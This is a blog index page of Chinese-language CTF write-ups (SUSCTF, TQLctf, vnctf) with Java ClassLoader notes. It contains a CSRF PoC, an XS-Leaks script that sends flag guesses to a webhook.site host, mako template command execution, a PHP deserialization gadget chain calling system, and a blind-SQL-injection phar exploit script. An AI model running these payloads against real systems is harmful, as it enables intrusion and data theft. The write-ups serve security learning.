<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">260</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2022/03/03/2022SUSCTF/">2022SUSCTF</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-03-03</time><div class="content"><h2 id="fxxkcors"><a href="#fxxkcors" class="headerlink" title="fxxkcors"></a>fxxkcors</h2><p>CSRF题目，但是之前没做过，学习一下，大概思路就是通过让robots访问这个表单，然后就可以提升权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;124.71.205.122:10002&#x2F;changeapi.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;text&#x2F;plain&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&#39;&#123;&quot;username&quot;:&quot;skr&quot;,&quot;test&quot;:&quot;&#39; value&#x3D;&#39;&quot;&#125;&#39; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit request&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      document.forms[0].submit();</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h2><p>跳转类型 XS-Leaks</p>
<p><a target="_blank" rel="noopener" href="https://xsleaks.dev/docs/attacks/navigations/">https://xsleaks.dev/docs/attacks/navigations/</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;robots&quot;</span> <span class="attr">content</span>=<span class="string">&quot;noindex&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> flag = <span class="string">&#x27;SUSCTF&#123;&#x27;</span></span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params">msg</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        fetch(<span class="string">&#x27;https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b?msg=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(msg))</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">trying</span>(<span class="params">keyword</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> win = <span class="built_in">window</span>.open(<span class="string">&#x27;http://123.60.29.171:10001/search?q=&#x27;</span> + keyword)</span></span><br><span class="line"><span class="javascript">          <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            win.location = <span class="string">&#x27;http://e050-220-133-126-220.ngrok.io/non.html&#x27;</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line">              if (win.history.length === 3) &#123;</span><br><span class="line"><span class="javascript">                send(<span class="string">&#x27;success:&#x27;</span> + keyword)</span></span><br><span class="line"><span class="javascript">              &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">//send(&#x27;fail:&#x27; + keyword)</span></span></span><br><span class="line">              &#125;</span><br><span class="line">              win.close();</span><br><span class="line">            &#125;, 1000)</span><br><span class="line">          &#125;, 1500)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        send(<span class="string">&#x27;start&#x27;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;abcdefghijklmnopqrstuvwxyz0123456789_</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;abcdefghijklmnopqrs</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// </span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> chars = <span class="string">&#x27;_abcdefghijklmnopqrstuv&#x27;</span>.split(<span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="comment">//let chars = &#x27;&#125;wxyz0123456789_&#x27;.split(&#x27;&#x27;)</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span>(<span class="keyword">let</span> char <span class="keyword">of</span> chars) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">const</span> temp = flag + char</span></span><br><span class="line">          trying(temp)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line">        run()</span><br><span class="line">      &#125;, 1000)</span><br><span class="line">      </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="HTML-practice"><a href="#HTML-practice" class="headerlink" title="HTML practice"></a>HTML practice</h2><p>使用<code>##</code>可以让页面空白——&gt;mako框架，</p>
<p>可以使用下面语句执行命令，但是无回显结果，不过可以存到其他文件夹里，使用文件重定向符号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">% for a in (self.module.cache.util.os.system(name),2,3):</span><br><span class="line">    1</span><br><span class="line">% endfor</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/27/java%E5%AE%A1%E8%AE%A1-javacon%E5%88%86%E6%9E%90/">java审计-javacon分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-27</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在前面做了那么多环境搭建以后，其中的漏洞难度利用其实不高，我感觉java的难点应该还是在反射、反序列化之类的地方，于是回来重新做一下</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>对jar进行解压，然后使用idea打开，配置一下远程，复制代码</p>
<p>使用一下命令运行jar包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;*:5005 -jar challenge-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/27/web%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/">web前端开发</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-27</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/26/2022TQLctf-0/">2022TQLctf</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-26</time><div class="content"><h2 id="sql-test"><a href="#sql-test" class="headerlink" title="sql_test"></a>sql_test</h2><p>看到这题有挖掘利用链的操作，学一下，感觉自己针对框架的链子挖掘还是很陌生</p>
<p>这是一个symphony的目录，所以先认识一下这个框架，了解项目之间的文件关系</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config&#x2F;:包含配置文件</span><br><span class="line">src&#x2F;:所有的php源代码</span><br><span class="line">templates&#x2F;:Twig模板文件</span><br><span class="line">bin&#x2F;：这里面主要是使用console文件,进行执行相关symfony命令</span><br><span class="line">var&#x2F;：主要是包含:缓存文件和日志文件</span><br><span class="line">vendor&#x2F;：第三方库文件</span><br><span class="line">public&#x2F;：web网站根目录，如果使用apache、nginx这样的web服务器，需要把根目录指向这个目录</span><br></pre></td></tr></table></figure>

<p>首先是挖掘链子，挖掘利用链，肯定是先找合适的destruct，但是翻了一下，发现destruct很多都有wake_up方法，所以转换思路，从其他魔术方法入手，先看看call方法,发现了两个可以进行命令执行的点，很明显，下面那个利用起来会更方便一些</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method, $args</span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(.*)(Debug|Info|Notice|Warning|Error|Critical|Alert|Emergency)(.*)/&#x27;</span>, $method, $matches) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">         $genericMethod = $matches[<span class="number">1</span>] . (<span class="string">&#x27;Records&#x27;</span> !== $matches[<span class="number">3</span>] ? <span class="string">&#x27;Record&#x27;</span> : <span class="string">&#x27;&#x27;</span>) . $matches[<span class="number">3</span>];</span><br><span class="line">         $level = strtolower($matches[<span class="number">2</span>]);</span><br><span class="line">         <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, $genericMethod)) &#123;</span><br><span class="line">             $args[] = $level;</span><br><span class="line">             <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, $genericMethod], $args);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">BadMethodCallException</span>(<span class="string">&#x27;Call to undefined method &#x27;</span> . get_class(<span class="keyword">$this</span>) . <span class="string">&#x27;::&#x27;</span> . $method . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>在这里，可以调用任意类的invoke()函数，所以我们去看看有没有适合的</p>
<p><code>namespace Symfony\Component\Cache\Traits;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="keyword">string</span> $method, <span class="keyword">array</span> $args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;redis ?: <span class="keyword">$this</span>-&gt;redis = <span class="keyword">$this</span>-&gt;initializer-&gt;__invoke();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;redis-&gt;&#123;$method&#125;(...$args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，在这里存在一个动态调用</p>
<p><code>namespace Symfony\Component\Console\Helper;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params">$var</span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;handler)($var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们只需要寻找一下能传入两个参数，并且拥有$xxx-&gt;xxx()的类即可</p>
<p>可以看到这里的destruct执行的commit函数有我们需要的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;commit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过执行$item-&gt;getExpiry即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;deferredItems) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $now         = microtime(<span class="literal">true</span>);</span><br><span class="line">        $itemsCount  = <span class="number">0</span>;</span><br><span class="line">        $byLifetime  = [];</span><br><span class="line">        $expiredKeys = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;deferredItems <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line">            $lifetime = ($item-&gt;getExpiry() ?? $now) - $now;</span><br></pre></td></tr></table></figure>

<p>接下来我们组装一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Doctrine</span>\<span class="title">Common</span>\<span class="title">Cache</span>\<span class="title">Psr6</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">CacheAdapter</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">private</span> $<span class="title">deferredItems</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deferredItems =<span class="keyword">array</span>(<span class="keyword">new</span> \Symfony\Component\Cache\Traits\RedisProxy());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">RedisProxy</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">redis</span>;</span><br><span class="line">        <span class="keyword">private</span> $initializer;</span><br><span class="line">        <span class="keyword">private</span> $ready = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redis = <span class="string">&quot;id&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;initializer = <span class="keyword">new</span> \Symfony\Component\Console\Helper\Dumper();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Console</span>\<span class="title">Helper</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dumper</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">a</span> = <span class="title">new</span> <span class="title">Doctrine</span>\<span class="title">Common</span>\<span class="title">Cache</span>\<span class="title">Psr6</span>\<span class="title">CacheAdapter</span>();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在本地测试一下就可以跑通了，接下来寻找一下反序列化点，可以看到没有unserialize，那一般就是phar反序列化了，需要寻找一下反序列化点。</p>
<p>本地测试了一下，成功触发：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220311200008.png" alt="img"></p>
<p>可以看到这里有个注入点,其中key和value可控，查询手册可知，key为选择操作的参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MYSQLI_INIT_COMMAND - 成功建立 MySQL 连接之后要执行的 SQL 语句</span><br></pre></td></tr></table></figure>

<p>通过使用这个操作，可以执行value的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Request $request</span>): <span class="title">Response</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $con = mysqli_init();</span><br><span class="line">    $key = $request-&gt;query-&gt;get(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">    $value = $request-&gt;query-&gt;get(<span class="string">&#x27;value&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_numeric($key) &amp;&amp; is_string($value)) &#123;</span><br><span class="line">        mysqli_options($con, $key, $value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>二分法盲注，我们前面知道，需要找到文件上传点，而这里有个注入点，所以先看看有没有写入权限</p>
<p>爆破出可写入目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;ce4d60d5da0336986edff5e01d97cC3e&#x2F;</span><br></pre></td></tr></table></figure>

<p>所以执行sql语句进行写入，wp中写到mysqli_server_public_key这个选项设计到文件操作，是指定服务端公钥的路径。</p>
<p>因为caching_sha2_password认证方式下服务器端会使用缓存，如果不指定公钥连接就是向服务器请求key，所以一旦请求一次成功连接会保留着缓存，导致不会去加载我们指定的公钥。在这里可以通过执行FLUSH PRIVILEGES的命令或者修改用户密码，导致连接失败，同样会触发加载公钥的操作</p>
<p>完整的payload如下：</p>
<p>但是本地起了docker以后跑失败了。。。可能是环境原因吧，毕竟用了出题人的exp跑了也不行，但是我觉得还是应该尝试一下这个mysql的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://110.42.133.120:7001&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">key, value</span>):</span></span><br><span class="line">    resp = requests.get(url + <span class="string">&quot;/index.php/test&quot;</span>, params=&#123;<span class="string">&#x27;key&#x27;</span>: key, <span class="string">&#x27;value&#x27;</span>: value&#125;)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_secure_file_path</span>():</span></span><br><span class="line">    file_path = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        low =<span class="number">0</span></span><br><span class="line">        high=<span class="number">264</span></span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">            payload = <span class="string">f&quot;select if (ascii(substr((select @@global.secure_file_priv),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(5),1);&quot;</span></span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            fi_time=time.time()</span><br><span class="line">            s.get(url+payload)</span><br><span class="line">            <span class="keyword">if</span> time.time()-fi_time&gt;<span class="number">4</span>:</span><br><span class="line">                low = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high=mid</span><br><span class="line">            mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(mid==<span class="number">0</span> <span class="keyword">or</span> mid==<span class="number">264</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        file_path +=chr(mid)</span><br><span class="line">    <span class="keyword">return</span> file_path</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    filename=<span class="string">&quot;&quot;</span>.join(random.sample(string.ascii_letters,<span class="number">6</span>))+<span class="string">&#x27;.phar&#x27;</span></span><br><span class="line">    file=os.path.join(file_path,filename)</span><br><span class="line"></span><br><span class="line">    hex_data=str(binascii.b2a_hex(open(<span class="string">&#x27;test.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read())).replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    print(hex_data)</span><br><span class="line">    command=<span class="string">f&quot;select 0x<span class="subst">&#123;hex_data&#125;</span> into dumpfile &#x27;<span class="subst">&#123;file&#125;</span>&#x27;&quot;</span></span><br><span class="line">    print(command)</span><br><span class="line">    req(<span class="string">&#x27;3&#x27;</span>,command)</span><br><span class="line"></span><br><span class="line">    command=<span class="string">f&quot;select if((ISNULL(load_file(&#x27;<span class="subst">&#123;file&#125;</span>&#x27;))),sleep(2),1);&quot;</span></span><br><span class="line">    <span class="keyword">if</span> req(<span class="string">&#x27;3&#x27;</span>, command).elapsed.seconds &gt; <span class="number">1.5</span>:</span><br><span class="line">        print(<span class="string">&quot;file write fail!&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    req(<span class="string">&#x27;3&#x27;</span>,<span class="string">&quot;FLUSH PRIVILEGES;&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    print(file)</span><br><span class="line">    resp = req(<span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;phar://&#x27;</span> + file)</span><br><span class="line">    print(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#file_path=get_secure_file_path()</span></span><br><span class="line">    file_path=<span class="string">&quot;/tmp/ce4d60d5da0336986edff5e01d97c73e/&quot;</span></span><br><span class="line">    print(file_path)</span><br><span class="line">    exp(file_path)</span><br></pre></td></tr></table></figure>

<p>echo加上要用的功能点名称就能输出value了</p>
<p>还有一点需要注意的是，python输出的时候会自带一个b’符号要将他置换为空，不然影响写入结果</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/24/classLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/">classLoader类加载机制</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-24</time><div class="content"><h2 id="ClassLoader类加载机制"><a href="#ClassLoader类加载机制" class="headerlink" title="ClassLoader类加载机制"></a>ClassLoader类加载机制</h2><p>在程序运行时，并不会一次性加载所有的class文件进入内存，而是通过java的类加载机制（ClassLoader）进行动态加载，从而转化成java.lang.Class类的一个实例。</p>
<h2 id="ClassLoader类"><a href="#ClassLoader类" class="headerlink" title="ClassLoader类"></a>ClassLoader类</h2><p>通过指定的类的名称，找到或生成对应的字节码，返回一个java.lang.Class的实例。开发者可以通过继承ClassLoader类来实现自定义的类加载器。</p>
<h3 id="ClassLoader类中和加载类相关的方法"><a href="#ClassLoader类中和加载类相关的方法" class="headerlink" title="ClassLoader类中和加载类相关的方法"></a>ClassLoader类中和加载类相关的方法</h3><p>1.getparent()：返回该类加载器的父类加载器</p>
<p>2.loadClass(String name)：加载名称为name的类，返回的结果是java.lang.Class类的实例</p>
<p>3.findClass(String name)：查找名称为name的类，返回的结果是java.lang.Class类的实例</p>
<p>4.findLoadedClass(String name)：查找名称为name的已经被加载过的类，返回的结果是java.lang.Class类的实例</p>
<p>5.defineClass(String name, bytep[] b,int off,int len)：把字节数组b中的内容转换成java类，返回的结果是java.lang.Class类的实例，该方法被声明为final</p>
<p>6.resolveClass(Class&lt;?&gt; c) ：链接指定的java类</p>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>1.当loadClass方法被调用时，会首先使用findLoadedClass()方法判断该类是否已经被加载。</p>
<p>2.若未被加载，则优先使用加载器的父类加载器进行加载</p>
<p>3.若不存在父类加载器，无法对该类进行加载时，就调用自身的findClass()方法。</p>
<p>因此可以重写findClass()来完成一些类加载的特殊要求。</p>
<h2 id="URLClassLoader类"><a href="#URLClassLoader类" class="headerlink" title="URLClassLoader类"></a>URLClassLoader类</h2><p>可以从远程服务器上加载类的能力</p>
<h2 id="java动态代理"><a href="#java动态代理" class="headerlink" title="java动态代理"></a>java动态代理</h2><p>动态代理实质是反射</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/23/2022tqlCTF/">2022tqlCTF</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-23</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/22/2022vnctf/">2022vnctf-rce小结</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-22</time><div class="content"><h2 id="InterestingPHP"><a href="#InterestingPHP" class="headerlink" title="InterestingPHP"></a>InterestingPHP</h2><h2 id="非预期——bypass-disable"><a href="#非预期——bypass-disable" class="headerlink" title="非预期——bypass_disable"></a>非预期——bypass_disable</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> highlight_file(<span class="keyword">__FILE__</span>); @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>测试了一下，可以使用file_put_contents，但是其他的命令执行不了</p>
<p>我们可以查看一下disable_function,但是由于phpinfo()用不了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(ini_get_all());</span><br></pre></td></tr></table></figure>

<p>可以发现disable_function过滤了很多东西，应该就是要绕了</p>
<p>既然可以写入文件，先试试一些disable_function实现rce</p>
